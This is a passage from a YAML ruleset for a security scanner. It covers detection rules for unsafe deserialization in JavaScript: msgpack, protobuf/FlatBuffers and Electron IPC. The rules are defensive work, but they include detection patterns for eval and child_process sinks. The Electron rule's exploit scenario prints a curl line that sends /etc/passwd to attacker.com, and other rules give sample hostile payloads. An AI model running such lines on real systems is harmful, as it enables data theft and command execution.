  # ============================================================================
  # DESER-JS-004: msgpack Unpack Untrusted Data
  # ============================================================================
  - rule_id: "DESER-JS-004"
    title: "MessagePack Unpack of Untrusted Data Leading to Object Injection"
    description: >
      Detects usage of MessagePack (msgpack, msgpack-lite, @msgpack/msgpack)
      deserialization functions on untrusted input. While MessagePack itself
      is a binary serialization format, many JavaScript implementations
      support custom extension types and codec configurations that can
      reconstruct complex object graphs. Processing attacker-controlled
      MessagePack data can lead to object injection, type confusion, and
      in some cases code execution through custom extension handlers.
    language: javascript
    category: deserialization
    severity: High
    confidence: 0.85
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - msgpack
      - messagepack
      - binary-format
      - type-confusion
      - object-injection
      - node
    detection_layer: 2
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: 'msgpack\.(unpack|decode)\s*\(\s*(req\.|ctx\.|event\.|data|input|payload|body|buffer|message)'
        description: "msgpack unpack/decode called on user-controlled input"
      - type: regex
        pattern: 'require\s*\(\s*["\x27](msgpack|msgpack-lite|@msgpack\/msgpack|msgpack5)["\x27]\s*\)'
        description: "Import of msgpack library"
      - type: regex
        pattern: 'decode\s*\(\s*new\s+Uint8Array\s*\(\s*(req\.|ctx\.|data|buffer|payload)'
        description: "msgpack decode on Uint8Array from untrusted source"
      - type: regex
        pattern: 'msgpack\.createCodec\s*\(\s*\{[^}]*allowExtType\s*:\s*true'
        description: "Custom codec with extension types enabled"
      - type: regex
        pattern: 'Decoder\s*\(\s*\{[^}]*extensionCodec'
        description: "Custom extension codec in Decoder configuration"
      - type: regex
        pattern: 'unpackMulti\s*\(\s*(req\.|data|body|buffer|payload)'
        description: "unpackMulti on user-controlled data allowing multiple object injection"
    anti_patterns:
      - 'msgpack\.(unpack|decode)\s*\(\s*msgpack\.(pack|encode)'
      - 'msgpack\.(unpack|decode)\s*\(\s*internal'
      - 'msgpack\.(unpack|decode)\s*\(\s*cache\.'
      - 'msgpack\.(unpack|decode)\s*\(\s*config\.'
      - '\/\/\s*test'
      - 'mock.*msgpack'
      - 'msgpack\.(unpack|decode)\s*\(\s*signed'
      - 'msgpack\.(unpack|decode)\s*\(\s*encrypted'
      - 'msgpack\.(unpack|decode)\s*\(\s*verified'
      - 'msgpack\.(unpack|decode)\s*\(\s*trusted'
      - 'hmac\.verify.*msgpack'
      - 'msgpack\.(unpack|decode)\s*\(\s*fixture'
      - 'msgpack\.(unpack|decode)\s*\(\s*sample'
    bypass_variants:
      - description: "Custom extension type handler executing code"
        pattern: 'extensionCodec\.register\s*\(\s*\{[^}]*decode\s*:\s*function'
      - description: "Dynamic codec assignment from user-controlled config"
        pattern: 'createCodec\s*\(\s*(req\.|config\[|options\[)'
      - description: "Aliased unpack function to avoid static detection"
        pattern: '(const|let|var)\s+\w+\s*=\s*msgpack\.(unpack|decode)\s*;'
    evasion_indicators:
      - "Custom extension type handlers with eval or Function constructor"
      - "Dynamic codec configuration from external source"
      - "Base64 encoded msgpack payload"
      - "Aliased decode function reference"
      - "Multi-stream msgpack processing"
    encoding_variants:
      - type: "base64"
        pattern: 'msgpack\.decode\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)'
      - type: "hex"
        pattern: 'msgpack\.decode\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]hex["\x27]\s*\)'
      - type: "arraybuffer"
        pattern: 'msgpack\.decode\s*\(\s*new\s+Uint8Array\s*\(\s*arrayBuffer\s*\)'
    multi_function_chain_patterns:
      - "WebSocket binaryMessage -> msgpack.decode -> database operation"
      - "gRPC stream -> Buffer -> msgpack.unpack -> service handler"
      - "MQTT message -> msgpack.decode -> IoT device command"
      - "Redis subscription -> msgpack.unpack -> state mutation"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Object injection via crafted msgpack payloads can override security-relevant properties or trigger type confusion in downstream processing"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "WebSocket binary message"
        sink: "msgpack.unpack / msgpack.decode"
        through: "Binary message handler"
      - source: "HTTP request body (application/x-msgpack)"
        sink: "msgpack.decode"
        through: "Custom body parser middleware"
      - source: "Redis pub/sub message"
        sink: "msgpack.unpack"
        through: "Subscriber callback"
    impact: |
      Unsafe MessagePack deserialization can lead to:
      - Object injection with attacker-controlled properties and types
      - Type confusion causing logic errors in downstream processing
      - Denial of Service through deeply nested or recursive structures
      - Code execution via custom extension type handlers
      - Memory corruption through crafted binary payloads
    remediation: |
      1. Validate msgpack output against a strict schema:
         ```javascript
         const { decode } = require('@msgpack/msgpack');
         const Ajv = require('ajv');
         const ajv = new Ajv();
         const validate = ajv.compile(expectedSchema);
         const data = decode(buffer);
         if (!validate(data)) {
           throw new Error('Invalid msgpack data structure');
         }
         ```
      2. Disable custom extension types when processing untrusted data:
         ```javascript
         const decoder = new Decoder({ extensionCodec: undefined });
         ```
      3. Implement size limits on incoming binary payloads.
      4. Use HMAC signatures to verify msgpack payload integrity before deserialization.
      5. Prefer JSON for external API communication where full type fidelity is not required.
    references:
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://github.com/msgpack/msgpack-javascript"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
    context_awareness:
      surrounding_context_patterns:
        - "msgpack import in same file"
        - "Binary WebSocket handler"
        - "Custom content-type parser for msgpack"
        - "No schema validation after unpack"
      taint_source_indicators:
        - "WebSocket binary data"
        - "req.body (binary)"
        - "MQTT message payload"
        - "gRPC stream data"
        - "Redis message"
      taint_sink_indicators:
        - "msgpack.unpack"
        - "msgpack.decode"
        - "Decoder.decode"
        - "unpackMulti"
      sanitization_patterns:
        - "Schema validation after decode"
        - "Type checking on decoded result"
        - "HMAC verification before decode"
        - "Size limit enforcement on buffer"
    severity_scoring:
      severity_weight: 8
      risk_score_formula_hint: "severity_weight * confidence * (extension_types_enabled ? 1.2 : 0.8)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A real-time collaboration service uses WebSocket with MessagePack
        serialization for binary efficiency. The server uses msgpack-lite
        with a custom codec that includes extension types for Date and
        RegExp objects. An attacker crafts a MessagePack binary payload
        with a malicious extension type that triggers a custom decode
        handler, injecting unexpected object types into the application
        state. This causes type confusion in the document merge logic,
        allowing the attacker to overwrite other users' documents.
      example_payload: "\\x82\\xa4type\\xa7command\\xa4data\\xc7\\x0f\\x01{malicious_ext_payload}"
      attacker_objective: "Inject arbitrary objects through MessagePack extension types to manipulate application state"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - "DESER-JS-005"
        - "DESER-JS-001"

  # ============================================================================
  # DESER-JS-005: FlatBuffers / Protocol Buffers Schema Bypass
  # ============================================================================
  - rule_id: "DESER-JS-005"
    title: "FlatBuffers or Protocol Buffers Schema Bypass via Untrusted Deserialization"
    description: >
      Detects scenarios where FlatBuffers or Protocol Buffers deserialization
      is performed on untrusted input without proper schema validation or
      where schema enforcement can be bypassed. While protobuf and flatbuffers
      are schema-based formats that provide some inherent safety, misuse such
      as using Any types, dynamic message parsing, unknown field forwarding,
      or accepting arbitrary bytes fields can lead to type confusion, schema
      bypass, and in some cases injection attacks through improperly validated
      nested messages or oneof fields.
    language: javascript
    category: deserialization
    severity: High
    confidence: 0.80
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - protobuf
      - flatbuffers
      - schema-bypass
      - type-confusion
      - binary-protocol
      - grpc
    detection_layer: 3
    attack_surface_type: "api"
    patterns:
      - type: regex
        pattern: '\.deserializeBinary\s*\(\s*(req\.|ctx\.|event\.|data|input|payload|body|buffer|message)'
        description: "Protocol Buffers deserializeBinary on untrusted input"
      - type: regex
        pattern: 'protobuf\.Root\.fromJSON\s*\([^)]*\)\.lookupType\s*\([^)]*\)\.decode\s*\('
        description: "Dynamic protobuf schema loading and message decoding"
      - type: regex
        pattern: 'google\.protobuf\.Any'
        description: "Usage of protobuf Any type allowing arbitrary message types"
      - type: regex
        pattern: 'flatbuffers\.ByteBuffer\s*\(\s*new\s+Uint8Array\s*\(\s*(req\.|data|body|buffer|payload)'
        description: "FlatBuffers ByteBuffer from untrusted input"
      - type: regex
        pattern: 'proto\.decode\s*\(\s*(req\.|data|body|buffer|payload|message)'
        description: "protobufjs decode on user-controlled data"
      - type: regex
        pattern: 'getRootAs\w+\s*\(\s*new\s+flatbuffers\.ByteBuffer'
        description: "FlatBuffers root object access from untrusted buffer"
      - type: regex
        pattern: 'Message\.decode\s*\(\s*Buffer\.from\s*\('
        description: "Protobuf message decode from buffer conversion"
      - type: regex
        pattern: 'grpc\.(deserialize|decode)\s*\(\s*(data|buffer|payload|message)'
        description: "gRPC deserialization of untrusted data"
    anti_patterns:
      - '\.decode\s*\(\s*\w+\.encode\s*\('
      - '\.deserializeBinary\s*\(\s*\w+\.serializeBinary'
      - '\/\/\s*test'
      - '\.decode\s*\(\s*internal'
      - '\.decode\s*\(\s*config\.'
      - 'mock.*protobuf'
      - '\.decode\s*\(\s*fixture'
      - '\.decode\s*\(\s*trusted'
      - '\.decode\s*\(\s*verified'
      - '\.decode\s*\(\s*signed'
      - 'schema\.validate.*decode'
      - '\.decode\s*\(\s*sample'
      - '\.decode\s*\(\s*expected'
      - '\.decode\s*\(\s*known'
    bypass_variants:
      - description: "Using protobuf Any type to embed arbitrary message types"
        pattern: '\.unpack\s*\(\s*google\.protobuf\.Any'
      - description: "Dynamic schema loading from untrusted source"
        pattern: 'protobuf\.load\s*\(\s*(req\.|data|url|path|config)\s*[,)]'
      - description: "Unknown field preservation allowing schema bypass"
        pattern: 'preserveUnknownFields\s*:\s*true|unknownFields\s*:\s*true'
    evasion_indicators:
      - "Dynamic .proto file loading from user-controlled path"
      - "Any type wrapping to bypass expected message schema"
      - "Unknown field forwarding passing unvalidated data to downstream services"
      - "Bytes field containing nested serialized messages"
      - "Oneof field type confusion"
    encoding_variants:
      - type: "base64_protobuf"
        pattern: 'decode\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]base64["\x27]\s*\)'
      - type: "hex_protobuf"
        pattern: 'decode\s*\(\s*Buffer\.from\s*\([^)]+,\s*["\x27]hex["\x27]\s*\)'
      - type: "json_to_protobuf"
        pattern: '(fromObject|fromJSON)\s*\(\s*JSON\.parse'
    multi_function_chain_patterns:
      - "gRPC request -> deserialize -> Any.unpack -> business logic"
      - "WebSocket binary -> protobuf.decode -> database operation"
      - "HTTP body -> flatbuffers.ByteBuffer -> data processing"
      - "Message queue -> protobuf decode -> microservice forwarding"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Schema bypass via Any types or unknown fields can lead to processing unexpected message types that bypass authorization checks in service mesh"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "gRPC client request"
        sink: "protobuf Message.decode"
        through: "gRPC server handler"
      - source: "HTTP request body"
        sink: "flatbuffers.ByteBuffer"
        through: "Custom binary body parser"
      - source: "Kafka message"
        sink: "protobuf decode"
        through: "Consumer deserialization"
    impact: |
      Protobuf/FlatBuffers schema bypass can lead to:
      - Type confusion causing incorrect business logic execution
      - Authorization bypass via unexpected message types through Any fields
      - Data corruption through malformed nested messages
      - Denial of Service via deeply nested or recursive message structures
      - Information leakage through unknown field forwarding
    remediation: |
      1. Avoid using google.protobuf.Any in public-facing APIs:
         ```protobuf
         // Bad: allows any message type
         message Request { google.protobuf.Any payload = 1; }
         // Good: use specific message types
         message Request { UserPayload payload = 1; }
         ```
      2. Disable unknown field preservation:
         ```javascript
         const options = { defaults: true, oneofs: true, unknownFields: false };
         const msg = MessageType.decode(buffer).toJSON(options);
         ```
      3. Validate decoded messages against business logic constraints.
      4. Implement message size limits at the transport layer.
      5. Use gRPC interceptors for input validation before handler execution.
    references:
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://protobuf.dev/programming-guides/proto3/"
      - "https://google.github.io/flatbuffers/"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
    context_awareness:
      surrounding_context_patterns:
        - "protobuf or flatbuffers import in same file"
        - "gRPC service handler"
        - "Any type usage in proto definition"
        - "No message validation after decode"
      taint_source_indicators:
        - "gRPC request"
        - "WebSocket binary data"
        - "HTTP binary body"
        - "Message queue payload"
        - "RPC call arguments"
      taint_sink_indicators:
        - "Message.decode"
        - "deserializeBinary"
        - "flatbuffers.ByteBuffer"
        - "Any.unpack"
        - "proto.decode"
      sanitization_patterns:
        - "Message field validation after decode"
        - "Type assertion on decoded message"
        - "Schema version checking"
        - "Message size limit enforcement"
    severity_scoring:
      severity_weight: 7
      risk_score_formula_hint: "severity_weight * confidence * (any_type_used ? 1.3 : 0.9)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        A microservice architecture uses gRPC with Protocol Buffers for
        inter-service communication. The user-facing API gateway accepts
        protobuf-encoded requests and forwards them to backend services.
        A message definition uses google.protobuf.Any for a flexible payload
        field. An attacker crafts a request that wraps an AdminCommand message
        type inside the Any field, which the backend service unpacks and
        processes without verifying the caller's authorization level. This
        allows the attacker to execute administrative operations.
      example_payload: "type.googleapis.com/internal.AdminCommand with embedded delete_all_users command"
      attacker_objective: "Bypass schema-level authorization by embedding unexpected message types in Any fields"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
    metadata:
      rule_version: "3.0.0"
      last_reviewed: "2025-01-15"
      rule_maturity_level: "hardened"
      detection_complexity: "contextual"
    cross_rule_intelligence:
      cross_file_risk_flag: true
      requires_ai_validation: true
      high_impact_flag: true
      related_rules:
        - "DESER-JS-004"
        - "DESER-JS-008"

  # ============================================================================
  # DESER-JS-006: Electron IPC Deserialization
  # ============================================================================
  - rule_id: "DESER-JS-006"
    title: "Electron IPC Deserialization Leading to Main Process Compromise"
    description: >
      Detects unsafe deserialization patterns in Electron IPC (Inter-Process
      Communication) channels where data from renderer processes (which may
      be compromised via XSS or malicious web content) is deserialized or
      processed by the main process without validation. Electron's structured
      clone algorithm for IPC can transfer complex objects including Buffers,
      TypedArrays, and in some configurations, prototypes. A compromised
      renderer can send crafted IPC messages to exploit deserialization
      in the main process, gaining access to Node.js APIs and the file system.
    language: javascript
    category: deserialization
    severity: High
    confidence: 0.88
    cwe: CWE-502
    owasp: "A08:2021-Software-and-Data-Integrity-Failures"
    tags:
      - deserialization
      - electron
      - ipc
      - main-process
      - renderer
      - sandbox-escape
      - desktop
    detection_layer: 2
    attack_surface_type: "internal"
    patterns:
      - type: regex
        pattern: 'ipcMain\.on\s*\(\s*["\x27][^"]*["\x27]\s*,\s*(async\s+)?\(\s*event\s*,\s*\w+'
        description: "ipcMain.on handler receiving data from renderer process"
      - type: regex
        pattern: 'ipcMain\.handle\s*\(\s*["\x27][^"]*["\x27]\s*,\s*(async\s+)?\(\s*event\s*,\s*\w+'
        description: "ipcMain.handle processing incoming IPC invocations"
      - type: regex
        pattern: 'JSON\.parse\s*\(\s*arg|JSON\.parse\s*\(\s*data|JSON\.parse\s*\(\s*message'
        description: "JSON.parse on IPC arguments in main process handler"
      - type: regex
        pattern: 'eval\s*\(\s*(arg|data|message|payload)'
        description: "eval on IPC data in main process - critical RCE"
      - type: regex
        pattern: 'child_process\.\w+\s*\([^)]*\b(arg|data|message|payload)\b'
        description: "child_process execution with IPC argument data"
      - type: regex
        pattern: 'require\s*\(\s*(arg|data|message|payload)'
        description: "Dynamic require with IPC-received module path"
      - type: regex
        pattern: 'ipcMain\.(on|handle)\s*\([^)]+\)\s*[^{]*\{\s*[^}]*fs\.(read|write|unlink|mkdir)'
        description: "File system operations within IPC handler using received data"
      - type: regex
        pattern: 'contextBridge\.exposeInMainWorld\s*\([^)]*,\s*\{[^}]*(exec|spawn|eval)'
        description: "contextBridge exposing dangerous APIs to renderer"
    anti_patterns:
      - 'ipcMain\.on\s*\([^)]*\)\s*[^{]*\{\s*[^}]*validate'
      - 'ipcMain\.on\s*\([^)]*\)\s*[^{]*\{\s*[^}]*sanitize'
      - 'ipcMain\.on\s*\([^)]*\)\s*[^{]*\{\s*[^}]*schema'
      - 'nodeIntegration\s*:\s*false'
      - 'contextIsolation\s*:\s*true'
      - 'sandbox\s*:\s*true'
      - '\/\/\s*test'
      - 'mock.*ipcMain'
      - 'jest\.mock.*electron'
      - 'typeof\s+arg\s*[!=]==\s*["\x27]string["\x27]'
      - 'ipcMain\.(on|handle).*whitelist'
      - 'ipcMain\.(on|handle).*allowlist'
      - 'webContents\.session\.setPermission'
    bypass_variants:
      - description: "Using webContents.send to trigger main process handler from compromised renderer"
        pattern: 'webContents\.send\s*\(\s*["\x27][^"]*["\x27]\s*,\s*\{'
      - description: "Remote module access from renderer to main process"
        pattern: 'enableRemoteModule\s*:\s*true|require\s*\(\s*["\x27]@electron/remote["\x27]\s*\)'
      - description: "Preload script exposing Node.js APIs without context isolation"
        pattern: 'contextIsolation\s*:\s*false.*preload'
    evasion_indicators:
      - "Renderer compromise via XSS sending crafted IPC messages"
      - "Remote module enabled allowing direct main process object access"
      - "Context isolation disabled enabling prototype pollution across contexts"
      - "Custom protocol handler deserialization"
      - "Deep link handler processing serialized data"
    encoding_variants:
      - type: "base64_ipc"
        pattern: 'Buffer\.from\s*\(\s*(arg|data|message)\s*,\s*["\x27]base64["\x27]\s*\)'
      - type: "json_ipc"
        pattern: 'JSON\.parse\s*\(\s*(arg|data|message|payload)\s*\)'
      - type: "structured_clone"
        pattern: 'structuredClone\s*\(\s*(arg|data|message)\s*\)'
    multi_function_chain_patterns:
      - "XSS in renderer -> ipcRenderer.send -> ipcMain.on -> exec"
      - "Deep link -> app.on('open-url') -> deserialization -> file access"
      - "Custom protocol -> protocol.handle -> parse -> Node.js API"
      - "Renderer -> ipcRenderer.invoke -> ipcMain.handle -> database query"
    privilege_context_flags:
      requires_auth_context: false
      admin_only_risk: false
      escalation_vector: "Compromised renderer process can escalate to full Node.js access in main process via unsafe IPC deserialization, escaping the browser sandbox"
    business_logic_indicator:
      financial_impact: true
      data_exposure_risk: true
      compliance_relevant: true
    probable_taint_paths:
      - source: "ipcRenderer.send / ipcRenderer.invoke arguments"
        sink: "ipcMain.on / ipcMain.handle callback"
        through: "Electron IPC channel"
      - source: "webContents.executeJavaScript return value"
        sink: "Main process handler"
        through: "IPC return channel"
      - source: "Deep link URL parameters"
        sink: "Main process URL handler"
        through: "app.on('open-url') event"
    impact: |
      Unsafe Electron IPC deserialization can result in:
      - Full main process compromise from renderer sandbox escape
      - Arbitrary file system read/write access
      - Native code execution via child_process
      - Credential theft from system keychain
      - Privilege escalation to operating system level
      - Installation of persistent backdoors
    remediation: |
      1. Enable context isolation and disable node integration:
         ```javascript
         new BrowserWindow({
           webPreferences: {
             nodeIntegration: false,
             contextIsolation: true,
             sandbox: true,
             preload: path.join(__dirname, 'preload.js')
           }
         });
         ```
      2. Validate all IPC inputs in main process handlers:
         ```javascript
         ipcMain.handle('save-file', async (event, data) => {
           if (typeof data.path !== 'string' || !isAllowedPath(data.path)) {
             throw new Error('Invalid path');
           }
           if (typeof data.content !== 'string' || data.content.length > MAX_SIZE) {
             throw new Error('Invalid content');
           }
           // Process validated data
         });
         ```
      3. Use contextBridge to expose only specific, validated API methods.
      4. Verify sender identity in IPC handlers using event.senderFrame.url.
      5. Remove @electron/remote and enableRemoteModule usage.
    references:
      - "https://www.electronjs.org/docs/latest/tutorial/security"
      - "https://cwe.mitre.org/data/definitions/502.html"
      - "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"
      - "https://blog.doyensec.com/2022/09/27/electron-context-isolation.html"
    context_awareness:
      surrounding_context_patterns:
        - "ipcMain handler in Electron main process file"
        - "No input validation in handler body"
        - "File system or child_process usage in handler"
        - "contextIsolation disabled in BrowserWindow config"
      taint_source_indicators:
        - "ipcMain.on callback arguments"
        - "ipcMain.handle callback arguments"
        - "app.on('open-url') URL parameter"
        - "Custom protocol handler data"
      taint_sink_indicators:
        - "child_process.exec"
        - "fs.writeFileSync"
        - "eval"
        - "require (dynamic)"
        - "shell.openExternal"
        - "dialog.showSaveDialog"
      sanitization_patterns:
        - "Type checking on IPC arguments"
        - "Path validation with path.normalize and allowlist"
        - "Input length limits"
        - "event.senderFrame.url verification"
    severity_scoring:
      severity_weight: 9
      risk_score_formula_hint: "severity_weight * confidence * (context_isolation_disabled ? 1.5 : 1.0)"
      exploitability_score: "High"
    exploit_scenario:
      attack_example: |
        An Electron application has contextIsolation disabled and processes
        IPC messages in the main process. A cross-site scripting vulnerability
        in the renderer process allows an attacker to inject JavaScript that
        sends crafted IPC messages:
        require('electron').ipcRenderer.send('execute-command', {
          cmd: 'curl attacker.com/steal?data=' + require('fs').readFileSync('/etc/passwd')
        });
        The main process IPC handler passes the cmd property to
        child_process.exec without validation, resulting in arbitrary
        command execution with the application's system privileges.
      example_payload: "ipcRenderer.send('exec', {cmd: 'id > /tmp/pwned'})"
      attacker_objective: "Escape renderer sandbox via IPC deserialization to achieve full system access through the main process"
    confidence_factors:
      pattern_strength: "high"
      context_match: "high"
      proximity_to_user_input: "high"
      sanitization_absence: "high"
